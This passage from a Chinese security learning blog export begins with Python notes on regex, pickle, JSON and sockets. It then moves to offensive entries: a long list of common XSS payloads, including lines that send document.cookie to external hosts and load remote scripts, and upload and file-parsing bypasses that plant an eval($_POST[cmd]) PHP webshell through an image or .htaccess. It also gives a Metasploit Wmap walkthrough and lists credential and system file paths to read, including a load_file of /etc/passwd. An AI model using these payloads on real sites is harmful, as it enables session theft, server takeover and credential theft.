匹配一个换行符，匹配一个制表符等 \1...\9 匹配第n个分组的内容。 \10 匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。 re.compile()函数定义: 根据包含正则表达式的字符串创建模式对象 格式: re.compile(pattern,flags=0) 匹配模式 flags 参数: re.I(re.IGNORECASE): 忽略大小写 re.M(MULTILINE): 多行模式，改变’^’和’$’的行为 re.S(DOTALL): 点任意匹配模式，改变’.’的行为 re.L(LOCALE): 使预定字符类 \w \W \b \B \s \S 取决于当前区域设定 re.U(UNICODE): 使预定字符类 \w \W \b \B \s \S \d \D 取决于unicode定义的字符属性 re.X(VERBOSE): 详细模式。这个模式下正则表达式可以是多行，忽略空白字符，并可以加入注释 re.match() 函数 定义:re.match 尝试从字符串的起始位置匹配一个模式，匹配成功re.match方法返回一个匹配的对象，如果不是起始位置匹配成功的话，match()就返回none 函数语法： re.match(匹配的正则表达式, 匹配的字符串, flags=0) 实例： 邮箱地址验证 # 可进行两种邮箱地址验证 (1) some123@any.any (2) some.some@any.any import re r1=re.compile(&apos;^[a-zA-Z0-9]+@[a-zA-Z]+\.[a-zA-Z]{3}$&apos;) r2=re.compile(&apos;^[a-zA-Z]+\.[a-zA-Z]+@[a-zA-Z]+\.[a-zA-Z]{3}$&apos;) addr=input(&quot;please input email:&quot;) def email(addr): if r1.match(addr): print (&quot;输入地址合法&quot;) m=re.match(r1,addr) print (&quot;您输入的地址为：&quot;+m.group()) elif r2.match(addr): print (&quot;输入地址合法&quot;) m=re.match(r2,addr) print (&quot;您输入的地址为：&quot;+m.group()) else: print (&quot;false&quot;) email(addr) re.search（）函数定义: 返回成功匹配的第一个对象 序列化 反序列化 变量从内存中变成可存储或传输的过程称之为序列化，python 中叫 pickling 变量内容从序列化的对象重新读到内存里称之为反序列化，即 unpickling 实例： import pickle # 序列化 d = dict(name=&quot;wu&quot;,age=20) file=pickle.dumps(d) # pickle.dumps()方法把任意对象序列化成一个bytes print (file) # 输出 b&apos;\x80\x03}q\x00(X\x04\x00\x00\x00nameq\x01X\x02\x00\x00\x00wuq\x02X\x03\x00\x00\x00ageq\x03K\x14u.&apos; f=open(&apos;dump.txt&apos;,&apos;wb&apos;) pickle.dump(d,f) # pickle.dump()直接把对象序列化后写入一个file-like Object f.close() # 反序列化 file1=pickle.loads(file) # pickle.loads()方法先把内容读到一个bytes然后反序列化出对象 print (file1) # 输出 {&apos;name&apos;: &apos;wu&apos;, &apos;age&apos;: 20} f=open(&apos;dump.txt&apos;,&apos;rb&apos;) #pickle.load()方法从一个file-like Object中直接反序列化出对象 file2=pickle.load(f) f.close() print (file2) # 输出 {&apos;name&apos;: &apos;wu&apos;, &apos;age&apos;: 20} JSON 用法 json.dumps()用于将dict类型的数据转成str json.dump()用于将dict类型的数据转成str，并写入到json文件中 json.loads()用于将str类型的数据转成dict json.load()用于从json文件中读取数据 实例： import json f = open(&quot;shodan-export.json&quot;,&apos;r&apos;) str = f.readlines() #读取整个文件所有行，保存在一个列表(list)中，每行作为一个元素，但读取大文件会比较占内存。 ips = [] for line in str: str_json = json.loads(line) #将json对象str类型转化为python字典（dict） ip = str_json[&apos;ip_str&apos;] #获取键值为ip_str的value值 ips.append(ip) f.close() f1 = open(&apos;iplist.txt&apos;,&quot;w&quot;) #写入新文件 for ip in ips: f1.write(ip+&quot;\n&quot;) f1.close() 网络编程 Socket是网络编程的一个抽象概念。通常我们用一个Socket表示“打开了一个网络链接”，而打开一个Socket需要知道目标计算机的IP地址和端口号，再指定协议类型即可。 创建Socket时，AF_INET 指定使用IPv4协议，AF_INET6 指定使用IPV6协议，SOCK_STREAM 指定使用面向流的TCP协议 参考链接： https://ciphersaw.me/2018/05/23/Python%20%E7%BB%9D%E6%8A%80%20%E2%80%94%E2%80%94%20TCP%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF/ socket 对象方法（服务端）：s.bind(address)s..listen(backlog)s.accept() socket 对象方法（客户端）：s.connect(address)s.connect_ex(address) socket 对象方法（公共）：s.recv(bufsize[,flag])s.send(string[,flag])s.send_all(string[,flag])s.recvfrom(bufzize[,flag])s.sendto(string[,flag],address)s.close()：关闭套接字s.getsockname()：返回套接字自己的地址，通常是一个元组（ipaddr,port）s.getpeername() ：返回套接字远程地址，通常是一个元组（ipaddr,port） Socket 编程实例：1234567891011121314151617181920212223242526 # TCP 连接 import sockets=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&apos;www.baidu.com&apos;,80)) # 建立连接s.send(b&apos;GET / HTTP/1.1\r\nHost: www.baidu.com\r\nConnection: close\r\n\r\n&apos;) # 发送数据buffer=[] #接收数据while True: d=s.recv(1024) #每次最多接受1k字节 if d: buffer.append(d) else: breakdata=b&apos;&apos;.join(buffer) # join（）于将序列中的元素以指定的字符连接生成一个新的字符串s.close() # 关闭连接header,html=data.split(b&apos;\r\n\r\n&apos;,1) # 以\r\n\r\n为分隔符对接收到的data进行分割，分割1次print (header.decode(&apos;utf-8&apos;))with open(&apos;baidu.html&apos;, &apos;wb&apos;) as f: # 把接受的数据写入文件 f.write(html) # 文件打开模式带b，写入文件内容时参数要用encode方法转为bytes形式，否则报错 urllib urllib的request模块可以非常方便地抓取URL内容，也就是发送一个GET请求到指定的页面，然后返回HTTP的响应 实例： from urllib import request with request.urlopen(&apos;https://www.baidu.com&apos;) as f: data=f.read() print (&apos;status:&apos;,f.status,f.reason) for k,v in f.getheaders(): print (&apos;%s %s&apos; %(k,v)) print (&apos;Data:&apos;,data.decode(&apos;utf-8&apos;))]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS漏洞学习]]></title>
    <url>%2F2018%2F12%2F09%2FXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[XSS漏洞的原理XSS漏洞是发生在目标网站中目标用户的浏览层面上，当用户浏览器渲染整个HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就会发生。 XSS漏洞的危害 获取用户或者管理员的Cookie XSS蠕虫 钓鱼攻击 挂马 键盘记录等 以下是可能嵌入跨源的资源的一些示例： 标签嵌入跨域脚本。语法错误信息只能在同浪脚本中捕 &lt;link rel=”stylesheet” href＝”…”＞标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的 Content－Type消息头。不同浏览器有不同的限制：IE， Firefox， Chrome， Safari（跳至CVE－2010－0051）部分和 Opera 嵌入图片。支持的图片格式包括PNG，JPEG，GlF，BMP，SVG， 和嵌入多媒体资源。 ，和的插件 @font-face引入的字体。一些浏览器允许跨域字体（ cross－origin fonts），一些需要同源字体（ same－origin fonts） 和载入的任何资源。站点可以使用 X-frame-optionsi消息头来阻止这种形式的跨域交互。 伪协议伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://，而是为关联应用程序而使用的。如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript: 我们可以在浏览地址栏里输入”javascript:alert(‘JS!’);”，点转到后会发现，实际上是把javascript: 后面的代码当JavaScript来执行，并将结果值返回给当前页面。（XSS Changes Stage #8） XSS 常用 payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&gt;&quot;&apos;&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;&apos;&apos;;!--&quot;&lt;script&gt;alert(0);&lt;/script&gt;=&amp;&#123;()&#125;&apos;&apos;;!--&quot;&lt;script&gt;alert(0);&lt;/script&gt;=&amp;&#123;(alert(1))&#125;`&gt;&lt;script&gt;alert(0)&lt;/script&gt;&lt;script&gt;a=eval;b=alert;a(b(/i/.source));&lt;/script&gt;&lt;code onmouseover=a=eval;b=alert;a(b(/g/.source));&gt;HI&lt;/code&gt;&lt;script src=http://xssor.io/xss.js&gt;&lt;/SCRIPT&gt;&lt;script&gt;location.href=&apos;http://127.0.0.1:8088/cookie.php?cookie=&apos;+escape(document.cookie);&lt;/script&gt;&apos;&quot;&gt;&lt;img onerror=alert(0) src=&gt;&lt;&quot;&apos;&lt;img src=http://127.0.0.1/myspace.asp&gt;&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:al&amp;#13;ert(0)&gt;&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:i=&quot;x=document.createElement(&apos;script&apos;);x.src=&apos;http://xssor.io/xn.js&apos;;x.defer=true;document.getElementsByTagName(&apos;head&apos;)[0].appendChild(x)&quot;;execScript(i)&gt;&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:i=&quot;x=docu&amp;#13;ment.createElement(&apos;\u0053\u0043\u0052\u0049\u0050\u0054&apos;);x.src=&apos;http://xssor.io/xn.js&apos;;x.defer=true;doc&amp;#13;ument.getElementsByTagName(&apos;head&apos;)[0].appendChild(x)&quot;;execScri&amp;#13;pt(i)&gt;new Image().src=&quot;http://xssor.io/phishing/cookie.asp?cookie=&quot;+escape(document.cookie);&lt;iframe src=http://www.baidu.com/&gt;&lt;/iframe&gt;&lt;body background=javascript:alert(/xss/)&gt;&lt;/body&gt;body&#123;xxx:expression(eval(String.fromCharCode(105,102,40,33,119,105,110,100,111,119,46,120,41,123,97,108,101,114,116,40,39,120,115,115,39,41,59,119,105,110,100,111,119,46,120,61,49,59,125)))&#125;&lt;style&gt;body&#123;width:ｅxpression(parent.document.write(unescape(&apos;%3Cscript%20src%3Dhttp%3A//xssor.io/phishing/%3E%3C/script%3E&apos;)));&#125;&lt;/style&gt;a&#123;xxx:expression(if(!window.x)&#123;alert(&apos;xss&apos;);window.x=1;&#125;)&#125;a&#123;xxx:\65\78\70\72\65\73\73\69\6f\6e\28\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\27\78\73\73\27\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\3b\7d\29&#125;body&#123;background:url(&quot;javascript:alert(&apos;xss&apos;)&quot;)&#125;body&#123;background:url(JavAs cr ipt:alert(0))&#125;&lt;style&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;xss&quot;)&apos;;&lt;/style&gt;@i\6d\70o\72\74&apos;javascr\ipt:alert(document.cookie)&apos;;&lt;div style=xss:expres&amp;#92sion(if(!window.x)&#123;alert(&apos;xss&apos;);window.x=1;&#125;)&gt;&lt;/div&gt;alert(String(/xss/).substr(1,3))alert(/xss/.source)&lt;a onclick=&quot;i=createElement(&apos;iframe&apos;);i.src=&apos;javascript:alert(/xss/)&apos;;x=parentNode;x.appendChild(i);&quot; href=&quot;#&quot;&gt;Test&lt;/a&gt;x=&apos;\x61\x6c\x65\x72\x74\x28\x31\x29&apos;;new Function(x)()&lt;a href=&quot;&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&quot;&gt;Test&lt;/a&gt;&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4=&quot;&gt;Test&lt;/a&gt;&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;div style=&quot;-moz-binding:url(http://xssor.io/0.xml#xss);x:expression((window.r!=1)?eval(&apos;x=String.fromCharCode;scr=document.createElement(x(115,99,114,105,112,116));scr.setAttribute(x(115,114,99),x(104,116,116,112,58,47,47,119,119,119,46,48,120,51,55,46,99,111,109,47,48,46,106,115));document.getElementById(x(105,110,106,101,99,116)).appendChild(scr);window.r=1;&apos;):1);&quot;id=&quot;inject&quot;&gt;javascript:document.scripts[0].src=&apos;http://127.0.0.1/yy.js&apos;;void(0);&lt;a href=&quot;javascript:x=open(&apos;http://www.xiaonei.com/&apos;);setInterval (function()&#123;try&#123;x.frames[0].location=&#123;toString:function()&#123;return%20&apos;http://xssor.io/Project/poc/docshell.html&apos;;&#125;&#125;&#125;catch(e)&#123;&#125;&#125;,3000);void(1);&quot;&gt;Test&lt;/a&gt;&lt;script/onreadystatechange=alert(1)&gt;&lt;script/src=data:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,alert(4)&gt;&lt;/script&gt;javascript:document.cookie=window.prompt(&quot;edit cookie:&quot;,document.cookie);void(0);&lt;input id=11 name=s value=`aa`onclick=alert(/xss/)&gt;&lt;input value:aa/onclick=alert(/xss/)&gt;&lt;li style=list-style:url() onerror=alert(1)&gt;&lt;div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)&gt;&lt;/div&gt;&lt;head&gt;&lt;base href=&quot;javascript://&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=&quot;/. /,alert(1)//#&quot;&gt;XXX&lt;/a&gt;&lt;/body&gt;&lt;OBJECT CLASSID=&quot;clsid:333C7BC4-460F-11D0-BC04-0080C7055A83&quot;&gt;&lt;PARAM NAME=&quot;DataURL&quot; VALUE=&quot;javascript:alert(1)&quot;&gt;&lt;/OBJECT&gt;&lt;div id=&quot;div1&quot;&gt;&lt;input value=&quot;``onmouseover=alert(1)&quot;&gt;&lt;/div&gt; &lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;&lt;script&gt;document.getElementById(&quot;div2&quot;).innerHTML = document.getElementById(&quot;div1&quot;).innerHTML;&lt;/script&gt;[!] ie only:&lt;div style=width:1px;filter:glow onfilterchange=alert(1)&gt;x&lt;title onpropertychange=alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script --&gt; &lt;!--[if&lt;img src=x onerror=alert(1)//]&gt; --&gt;[!] parsing error:&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;&lt;comment&gt;&lt;img src=&quot;&lt;/comment&gt;&lt;img src=x onerror=alert(1))//&quot;&gt;&lt;![&gt;&lt;img src=&quot;]&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;&lt;b &lt;script&gt;alert(1)&lt;/script&gt;0&lt;x &apos;=&quot;foo&quot;&gt;&lt;x foo=&apos;&gt;&lt;img src=x onerror=alert(1)//&apos;&gt;[!] special tags parsing issues, from: http://html5sec.org/#html&lt;? foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;! foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/ foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;? foo=&quot;&gt;&lt;x foo=&apos;?&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&quot;&gt;&lt;! foo=&quot;[[[Inception]]&quot;&gt;&lt;x foo=&quot;]foo&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;% foo&gt;&lt;x foo=&quot;%&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;[!] fuzzing tips: &lt;img[a][b][c]src[d]=x[e]onerror=[f]&quot;alert(1)&quot;&gt;&lt;a href=java&amp;#1&amp;#2&amp;#3&amp;#4&amp;#5&amp;#6&amp;#7&amp;#8&amp;#11&amp;#12script:alert(1)&gt;XXX&lt;/a&gt;[!] utf-7 bom+/v8+/v9+/v++/v/[!] html5sec.org&lt;svg/onload=alert(1)&gt;&lt;form id=&quot;test&quot;&gt;&lt;/form&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:alert(1)&quot;&gt;X&lt;/button&gt;&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;&lt;iframe srcdoc=&quot;&lt;svg onload=alert(1)&amp;nvgt;&quot;&gt;&lt;/iframe&gt;&lt;frameset onload=alert(1)&gt;&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;&lt;title&gt;&lt;img src=&quot;&lt;/title&gt;&lt;img src=x onerror=alert(1)//&quot;&gt; // by evilcos&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;&lt;frameset onpageshow=&quot;alert(1)&quot;&gt;&lt;body onpageshow=&quot;alert(1)&quot;&gt;&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`-alert(123)&lt;/script&gt;&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`+alert(123)&lt;/script&gt;&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`/alert(123)&lt;/script&gt;&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`%alert(123)&lt;/script&gt;&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`==alert(123)&lt;/script&gt;&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`/=alert(123)&lt;/script&gt; # Only Edge&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`*=alert(123)&lt;/script&gt; # Only Edge&lt;img/src==&quot;x onerror=alert(1)//&quot;&gt;&lt;div/style==&quot;x onclick=alert(1)//&quot;&gt;XSS&apos;OR&lt;div style=behavior:url(&quot; onclick=alert(1)//&quot;&gt;XSS&apos;OR&lt;div style=x:x(&quot; onclick=alert(1)//&quot;&gt;XSS&apos;OR&lt;div&gt; &lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;base href=&quot;javascript:\ &lt;/div&gt;&lt;div id=&quot;x&quot;&gt;&lt;/div&gt;&lt;div&gt;&lt;base href=&quot;javascript:/&quot;&gt;&lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;base href=&quot;javascript:\&quot;&gt;&lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;base/href=javascript:/&gt;&lt;a href=/*&apos;&quot;+-/%~.,()^&amp;$#@!*/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;&lt;noembed&gt;&lt;img src=&quot;&lt;/noembed&gt;&lt;iframe onload=alert(1)&gt;&quot; /&gt;&lt;/noembed&gt;]]></content>
      <categories>
        <category>漏洞学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Web扫描器-Metasploit'-Wmap]]></title>
    <url>%2F2018%2F12%2F09%2FWeb%E6%89%AB%E6%8F%8F%E5%99%A8-Metasploit'-Wmap%2F</url>
    <content type="text"><![CDATA[Metasploit’Wmap Web扫描器使用第一次使用需要初始化并启动数据库 启动 metasploit root@kaili:~# msfconsole 进入控制台，加载wmap模块 msf &gt; load_wmap成功加载如下图 help 查看 wmap 参数 msf &gt; help 添加扫描站点 msf &gt; wmap_sites -a http://X.X.X.X 查看扫描站点 msf &gt; wmap_sites -l 若添加错误，删除站点可以用 msf &gt; wmap_sites -d &lt;Id&gt; 设置扫描站点 msf &gt; wmap_targets -d &lt;Id&gt; 查看扫描目标列表 msf &gt; wmap_targets -l 载入扫描需要使用的 EXP 模块 msf &gt; wmap_run -t -m 参数和正则表达式使用可以选择使用模块 开始进行扫描 msf &gt; wmap_run -e 查看扫描结果汇总msf &gt; wmap_vluns -l或者可以直接使用 vluns 结果一样 总结 Wmap借助于Metasploit的模块扫描目标应用和主机的漏洞。它从Metasploit的数据库和模块中获取目标主机和应用的信息并将扫描结果返回给数据库。允许用户使用和配置Metasploit中的辅助模块，对网站进行集中扫描。]]></content>
      <categories>
        <category>Metasploit 渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[文件解析漏洞]]></title>
    <url>%2F2018%2F12%2F09%2F%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[解析漏洞 一些特殊文件被IIS Apache Nginx在某种情况下解析成脚本文件格式的漏洞 IIS 6.0解析漏洞 目录解析漏洞 /xx.asp/xx.jpg 在网站下创建文件夹名字为.asp .asa的文件夹，其目录内的任何扩展名的文件都被iis当做asp文件来解析并执行。因此只要攻击者可以通过该漏洞直接上传图片马，并且可以不需要改后缀名 文件解析 xx.asp;.jpg 在iis6.0下，分号后面的不被解析，所以xx.asp;.jpg被解析为asp脚本得以执行。 文件类型解析 .asa .cer .cdx iis 6.0 默认的可执行文件除了asp还包含这三种asa、cer、cdx IIS 7.0/IIS 7.5/Nginx &lt;=0.8.37 在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.[PHP]会将 /xx.jpg /xx.php 解析为 php 文件。 常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾e.g. copy xx.jpg/b + yy.txt/a xy.jpg /b 即二进制[binary]模式 /a 即ascii模式，生成 xx.jpg正常图片文件 yy.txt 内容 &lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt; 意思为写入一个内容为&lt;?php eval($_POST[cmd])?&gt; 名称为shell.php的文件 找个地方上传xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。 此时在图片目录下生成一句话木马 shell.php 密码 cmd Nginx &lt;=0.8.37 解析漏洞在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞 在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。 Apache 解析漏洞后缀解析：test.php.x1.x2.x3 Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析 test.php.x1.x2.x3 则会被解析为php php|php3|phtml多可被Apache解析 Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断. 例 cracer.php.owf.rar中 .owf和.rar这两种后缀是apache不可识别解析,apache就会把cracer.php.owf.rar解析成php 如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个cracer.php.rara.jpg.png…（把知道的常见后缀都写上…）去测试是否是合法后缀。 如果Apache中.htaccess可被执行并可被上传，那么可以尝试在.htaccess中写入 "shell.jpg"> SetHandler application/x-httpd-php ```12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061 然后再上传`shell.jpg`的木马，这样`shell.jpg`就可被解析为PHP文件了。 .htaccess文件是Apache服务器中的一个配置文件，负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置##### PHP CGI解析漏洞当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问`http://www.xxx.com/x.txt/x.php`时，若`x.php`不存在，则PHP会递归向前解析，将`x.txt`当作`php`脚本来解析IIS中：`任意文件名/任意文件名.php`就会被解析为`php`Nginx中：`任意文件名/任意文件名.php`就会被解析为`php`##### 操作系统解析 由于windows会将文件的后缀中的空格以及点进行过滤，如果遇到是黑名单校验的，如限制不允许上传PHP文件，而系统又是windows系统，那么我们可以上传`xx.php` ，或者`xx.php.`通过这种方式就可以绕过黑名单检验的文件上传##### 文件头欺骗漏洞在一句话木马前面加入`GIF89a`，然后将木马保存为图片格式，可以欺骗简单的`waf`。##### filepath漏洞filepath漏洞主要用来突破服务器自动命名规则，主要有以下两种利用方式： 1. 改变文件上传后路径`(filepath)`，可以结合目录解析漏洞，路径`/x.asp/` 2. 直接改变文件名称(都是在`filepath`下进行修改)，路径`/x.asp;`##### 00截断00截断的两种利用方式： 1. 更改filename，`xx.php .jpg`在burpsuit中将空格对应的 *hex* `2e`改为`00` 2. 更改filename，`xx.php%00.jpg` 在burpsuit中将`%00`进行右键转换`-url-urldecoder`##### filetype漏洞filetype漏洞主要是针对`content-type`字段，主要有两种利用方式： 1. 先上传一个图片，然后将`content-type:images/jpeg`改为`content-type:text/asp`，然后对filename进行`00截断`，将图片内容替换为一句话木马。 2. 直接使用burp抓包，得到`post`上传数据后，将`Content-Type: text/plain`改成 `Content-Type: image/gif`。##### iconv函数限制上传 如果发现不论上传什么文件，上传后的文件都会自动添加一个`.jpg`的后缀，那么可以怀疑是否是使用`iconv`这个函数进行了上传的限制，此时可以使用`80-EF截断`，也就是修改 *HEX* 为`80`到`EF`中的某一个来进行截断，如果真是使用这个函数的话，那么将上传任意文件成功，如上传一个`xx.php `，然后截断抓包将后面的空格对应的十六进制改为`80`到`EF`中的任意一个##### 双文件上传再一个文件上传的地方，右键审查元素，首先修改`action`为完整路径，然后复制粘贴上传浏览文件`&lt;input ......&gt;`，这样就会出现两个上传框，第一个上传正常文件，第二个选择一句话木马，然后提交。##### 表单提交按钮我们有时扫描发现上传路径，可是只有一个浏览文件，却没有提交按钮，此时我们就需要写入提交按钮。 写入表单： F12审查元素，在选择文件表单下面添加提交按钮代码。 ```&lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;xx&quot;&gt;]]></content>
      <categories>
        <category>漏洞学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[数据库信息]]></title>
    <url>%2F2018%2F12%2F09%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%2F</url>
    <content type="text"><![CDATA[一些 CMS 数据库安装配置信息123dedecms /data/common.inc.phpDiscuz /config_global_default.php、config /config_ucenter.php、config.inc.phpPHPCMS V9 caches/configs/database.php 一些常见的系统文件 Windows 下 1234567891011121314151617181920c:/boot.ini //查看系统版本 c:/windows/php.ini //php配置信息 c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 c:/winnt/php.ini c:/winnt/my.ini c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码 c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码 c:\Program Files\Serv-U\ServUDaemon.ini c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置 c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码 c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此 c:\Program Files\RhinoSoft.com\ServUDaemon.exe C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件 //存储了pcAnywhere的登陆密码 c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件 c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息. c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机 d:\APACHE\Apache2\conf\httpd.conf C:\Program Files\mysql\my.ini C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码 LUNIX/UNIX 下 12345678910111213141516171819202122232425/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件 /usr/local/apache2/conf/httpd.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 /usr/local/app/php5/lib/php.ini //PHP相关设置 /etc/sysconfig/iptables //从中得到防火墙规则策略 /etc/httpd/conf/httpd.conf // apache配置文件 /etc/rsyncd.conf //同步程序配置文件 /etc/my.cnf //mysql的配置文件 /etc/redhat-release //系统版本 /etc/issue /etc/issue.net /usr/local/app/php5/lib/php.ini //PHP相关设置 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件 /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件 /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 /etc/sysconfig/iptables 查看防火墙策略 load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录 replace(load_file(0×2F6574632F706173737764),0×3c,0×20) replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32)) 参考链接：https://blog.csdn.net/m0_37438418/article/details/80289025]]></content>
      <categories>
        <category>数据库学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[上传绕过]]></title>
    <url>%2F2018%2F12%2F09%2F%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%2F</url>
